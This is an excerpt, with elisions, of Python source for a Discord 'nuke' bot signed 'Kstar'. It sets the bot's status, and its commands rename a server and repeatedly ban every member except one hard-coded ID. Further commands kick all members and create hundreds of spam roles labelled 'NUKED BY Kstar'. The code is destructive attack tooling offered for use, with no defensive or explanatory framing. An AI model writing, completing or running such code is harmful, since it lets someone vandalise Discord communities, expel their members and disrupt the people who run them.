...
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "Kstar " ))#change this if you want
  print(f''' 
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="Kstar")
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED BY Kstar")
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED BY Kstar")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED BY Kstar")
